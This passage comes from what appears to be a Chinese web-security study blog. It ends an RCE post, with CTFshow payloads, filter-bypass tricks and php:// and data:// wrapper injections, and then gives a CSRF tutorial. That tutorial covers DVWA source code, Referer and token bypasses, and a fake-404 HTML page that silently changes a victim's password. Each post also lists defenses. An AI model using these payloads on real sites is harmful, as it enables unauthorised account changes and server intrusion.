flag<br>uniq -c flag<br>bash -v flag<br>rev flag<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">09</span>（url传递）(cat%<span class="hljs-number">09</span>flag.php)<br>cat$&#123;IFS&#125;flag<br>a=fl;b=ag;cat$IFS$a<span class="hljs-variable">$b</span><br>&#123;cat,flag&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>攻击者可以通过RCE继承web用户的权限，执行php代码，如果web的权限比较高的话，就可以读写目标服务器任意文件的内容，甚至控制整个网站</p><p>‍</p><p>‍</p><p>‍</p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><p>尽量不要使用命令执行函数。</p><p>不要让用户控制参数。</p><p>执行前做好检测和过滤</p><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><ul><li><p>白盒–CTFshow</p><ol><li><p>web29—通配符</p><p> <code>?c=system(&#39;tac fla*.php&#39;);</code>​</p><p> <img src="/assets/image-20240825151146-geazy57.png" alt="image">​</p><p> <img src="/assets/image-20240825151302-r9cnln5.png" alt="image">​</p></li><li><p>web30—取代函数&amp;通配符&amp;管道符</p><p> <code>?c=echo shell_exec(&#39;tac fla*&#39;);</code>​</p><p> <img src="/assets/image-20240825151330-oko8fj6.png" alt="image">​</p><p> <img src="/assets/image-20240825151429-x5h3y0l.png" alt="image">​</p></li><li><p>web31—参数逃逸</p><p> <code>?c=eval($_GET[1]);&amp;1=system(&#39;tac flag.php&#39;);  //为什么这样写，因为代码只检测参数c</code>​</p><p> <img src="/assets/image-20240825151501-fodbdzh.png" alt="image">​</p><p> <img src="/assets/image-20240825151545-zcb9ebx.png" alt="image">​</p></li><li><p>web32~36—配合包含&amp;伪协议</p><p> <code>?c=include$_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(&#39;tac flag.php&#39;);?&gt;</code>​</p><p> <img src="/assets/image-20240825151623-k66f7en.png" alt="image">​</p><p> <img src="/assets/image-20240825151706-1fvycxc.png" alt="image">​</p><p> <code>?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</code>​</p><p> <img src="/assets/image-20240825151739-tmwh44q.png" alt="image">​</p></li><li><p>web37~39—包含RCE&amp;伪协议&amp;通配符</p><p> <code>data://text/plain,&lt;?php system(&#39;tac fla*&#39;);?&gt;</code>​<br> ​<code>php://input post:&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code>​</p></li></ol></li><li><p>黑盒–代码在线运行平台测试</p><p>发现可能存在rce</p><p><img src="/assets/image-20240825151929-k252en9.png" alt="image">​</p><p>反弹shell</p><p><img src="/assets/image-20240825152005-p6lkzi1.png" alt="image">​</p><p>成功</p><p><img src="/assets/image-20240825152038-glp6tl7.png" alt="image">​</p></li></ul><p>‍</p><p>‍</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>RCE漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF漏洞👾</title>
    <link href="/2024/03/26/CSRF%E6%BC%8F%E6%B4%9E%F0%9F%91%BE/"/>
    <url>/2024/03/26/CSRF%E6%BC%8F%E6%B4%9E%F0%9F%91%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>CSRF 漏洞（跨站请求伪造）是由于未校验请求来源，导致攻击者可在第三方站点发起 HTTP 请求，并以受害者的<strong>目标网站登录态</strong>（cookie、session 等）请求，从而执行一些敏感的业务功能操作，即利用用户已经登陆或已经授权的状态，伪造合法用户发出请求给受信任的网点，从而实现在未授权的情况下执行一些特权操作。</p><p><img src="/assets/image-20240823171126-grp2tl2.png" alt="image">​</p><p><img src="/assets/image-20240823172906-48vg9du.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><a href="https://blog.csdn.net/besmarterbestronger/article/details/102544093">CSRF、Cookie、Session和token之间不得不说得那些事儿_csrf token和我们常说的token-CSDN博客</a></p><p>‍</p><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><p>‍</p><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>在修改密码，转账，充值等页面进行尝试</p><p>‍</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>看代码检验（有无token，来源检验等）</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><p>参数通过url进行传递，但是容易被发现，此时可以采用短链接—网站：<a href="http://www.dlj.bz/links">http://www.dlj.bz/links</a></p><p>简单示例</p><p>银行站点A：它以GET请求来完毕银行转账的操作，如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.mybank.com/Transfer.php?toBankId=<span class="hljs-number">11</span>&amp;money=<span class="hljs-number">1000</span>（这里可以将此链接通过短链接的形式转换为不易发现的状态）<br></code></pre></td></tr></table></figure><p>危险站点B：它里面有一段HTML的代码，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="hljs-string">11&amp;money</span>=<span class="hljs-string">1000</span>&gt;</span><br></code></pre></td></tr></table></figure><p>受害者登录了银行站点A，然后访问危险站点B，噢，这时会发现受害者的银行账户少了1000块。</p><p>‍</p><p>‍</p><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><p><img src="/assets/image-20240327192304-62eij5c.png" alt="image">​</p><p>通常使用钓鱼网站，在网站中放置一个自动提交的表单（生成：BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc），受害者访问即触发请求</p><p>‍</p><h3 id="无检测防护"><a href="#无检测防护" class="headerlink" title="无检测防护"></a>无检测防护</h3><p>检测：黑盒手工利用测试，白盒看代码检验（有无token，来源检验等）</p><p>简单示例</p><p>抓一个新增管理员的数据包</p><p><img src="/assets/image-20240818140546-t7sedp3.png" alt="image">​</p><p>鼠标右键打开生成：BurpSuite-&gt;Engagement tools-&gt;Generate CSRF Poc</p><p><img src="/assets/image-20240818140646-zax89bf.png" alt="image">​</p><p>勾选使自动触发脚本</p><p><img src="/assets/image-20240818181319-cn430f9.png" alt="image">​</p><p>并保存到自己的站点下，此时诱导受害者访问该站点</p><p><img src="/assets/image-20240818190025-qubwl11.png" alt="image">​</p><p><img src="/assets/image-20240818190055-5k0krvd.png" alt="image">​</p><p><img src="/assets/image-20240818190319-lcwspej.png" alt="image">​</p><p>‍</p><h3 id="Referer同源检测"><a href="#Referer同源检测" class="headerlink" title="Referer同源检测"></a>Referer同源检测</h3><p>就是判断Referer这个值是不是同一个域名或者同一个源下</p><p><img src="/assets/image-20240818190517-ld65qn3.png" alt="image">​</p><p>同上创建一个.html文件并放到自己的站点下，然后诱导访问</p><p><img src="/assets/image-20240818190633-x7y7t2n.png" alt="image">​</p><p>此时抓包</p><p><img src="/assets/image-20240818190705-wsd9rt1.png" alt="image">​</p><p><img src="/assets/image-20240818190754-2sqvxvo.png" alt="image">​</p><p>查看源码，搜索关键词referer</p><p><img src="/assets/image-20240818190845-0xfdp8c.png" alt="image">​</p><p><img src="/assets/image-20240818190925-9krmelp.png" alt="image">​</p><p><img src="/assets/image-20240818190947-dfai6s2.png" alt="image">​</p><p><img src="/assets/image-20240818191007-ef4ldk0.png" alt="image">​</p><p>绕过方法：把referer来源改下就行</p><p><img src="/assets/image-20240818191056-93cxq85.png" alt="image">​</p><p><img src="/assets/image-20240818191120-ogwaefb.png" alt="image">​</p><p>但是这里又有个问题，就是受害者不可能自己去改referer这个值呀。<br>只能尝试一下下面三种方式绕过</p><p>绕过1：配合文件上传绕过<br>绕过2：配合存储XSS绕过（将burp给出的poc html转换为javascript格式输出的然后放到xss中）<br>绕过3：去掉检测来源头(代码逻辑问题)  </p><meta name="referrer" content="no-referrer"><p><img src="/assets/image-20240818191254-0c81vhv.png" alt="image">​</p><p><img src="/assets/image-20240818191310-5vw1gl1.png" alt="image">​</p><p><img src="/assets/image-20240818191334-dm1vcsi.png" alt="image">​</p><p>原因在于源码中，这里referer为空但是返回为true，是因为在浏览器打开新窗口访问URL从而导致没有来源这个头部信息特意写的</p><p><img src="/assets/image-20240818191409-855cjvj.png" alt="image">​</p><p><img src="/assets/image-20240818191526-0kegkw0.png" alt="image">​</p><p>‍</p><h3 id="Token校验"><a href="#Token校验" class="headerlink" title="Token校验"></a>Token校验</h3><p>token(令牌,也可以理解为暗号,在数据传输之前，要先进行暗号的核对，暗号不一致则拒绝数据传输)<br>CSRF_token 对关键操作增加Token参数，token必须随机，每次都不一样，存储在cookie中，与验证码一样</p><p>两种简单绕过方法（均是由于代码逻辑问题）</p><p>绕过：将Token参数值复用（代码逻辑不严谨）能够重复使用token<br>绕过：将Token参数删除（代码逻辑不严谨）把token整个参数值删掉</p><p>其他绕过方法详见文章</p><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120581841">CSRF的绕过方法与利用_csrf绕过-CSDN博客</a></p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>1.数据泄露：攻击者可以利用CSRF攻击窃取用户的敏感信息，如账户密码、信用卡信息等，造成用户的隐私泄露和财产损失。</p><p>2.非法操作：攻击者可以通过CSRF攻击对受信任的网站进行非法操作，如篡改数据、发布虚假信息等，给企业或个人带来损失。</p><p>3.拒绝服务ddos：攻击者可以利用大量的伪造请求对服务器进行攻击，导致服务器瘫痪，使合法用户无法正常访问。</p><p>4.传播CSRF蠕虫：例如某个社交网站爆出的漏洞，让某个用户查看恶意页面后，给他所有好友发送短信，短信中又包含了这个恶意页面； 好友点击的话，又会给他的好友发送短信，这样就开始了传播，受感染的人也将越来越多。</p><p>‍</p><p>‍</p><h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><ol><li>增加 Token 验证（常用做法）</li></ol><p>对关键操作增加 Token 参数，token 必须随机，每次都不一样</p><ol start="2"><li>关于安全的会话管理（避免会话被利用）</li></ol><p>不要在客户端保存敏感信息（比如身份验证信息）</p><p>退出、关闭浏览器时的会话过期机制</p><p>设置会话过机制，比如 15 分钟无操作，则自动登录超时</p><ol start="3"><li>访问控制安全管理</li></ol><p>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</p><p>敏感信息的修改使用 POST，而不是 GET</p><p>通过 HTTP 头部中的 REFERER 来限制原页面</p><ol start="4"><li>增加验证码</li></ol><p>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）</p><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><a href="assets/csrf%E6%B3%A8%E9%94%80%E8%B4%A6%E5%8F%B7-20240327201312-ovfocar.docx">csrf注销账号.docx</a></p><p><a href="assets/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9Ecsrf%E6%8C%96%E6%8E%98-20240327201320-vxpk5fv.docx">基础漏洞csrf挖掘.docx</a></p><h2 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><h3 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里没有做任何防护仅检查了<code>password_new</code>​和<code>password_conf</code>​是否相同，如果相同则修改成功,这里设置密码为password，url上直接显示出来了</p><p><img src="/assets/image-20240409212708-tmeod1g.png" alt="image">​</p><p>此时在url上直接修改密码为77777，显示修改成功</p><p><img src="/assets/image-20240409220258-rqq1ftj.png" alt="image">​</p><p>‍</p><h3 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Checks to see where the request came from</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-comment">// Get input</span><br>        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>        <span class="hljs-comment">// Do the passwords match?</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>            <span class="hljs-comment">// They do!</span><br>            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>            <span class="hljs-comment">// Update the database</span><br>            <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>            <span class="hljs-comment">// Feedback for the user</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Issue with passwords matching</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Didn&#x27;t come from a trusted source</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>stripos(str1, str2)</code>​ 函数检查str2在str1中出现的位置（不区分大小写)</p><p>这里表示检查变量<code>HTTP_REFERER</code>​ （http包头部的Referer字段的值，表示来源地址）是否包含<code>SERVER_NAME</code>​（http包头部的 Host 字段表示要访问的主机名）。</p><p>这里使用bp抓包</p><p><img src="/assets/image-20240409223313-bj7ag2y.png" alt="image">​</p><p>方法一：</p><p>将Host与Referer修改一致</p><p><img src="/assets/image-20240409223313-bj7ag2y.png" alt="image">​</p><p><img src="/assets/image-20240409223422-knzyfcb.png" alt="image">​</p><p>方法二：</p><p>构造恶意html,放到被攻击网站根目录下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.188.168/dv/vulnerabilities/csrf/?password_new=666&amp;password_conf=666&amp;Change=Change#&quot;</span><span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found.<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改</p><p><code>Host 192.168.188.168</code>​</p><p><code>Referer：http://192.168.188.168/192.168.188.168.html</code>​</p><p>此时原本的password已经无法登陆了，而恶意页面指定修改为666可以成功登录。</p><p><img src="/assets/image-20240409224053-zij3pav.png" alt="image">​</p><p>‍</p><h3 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title 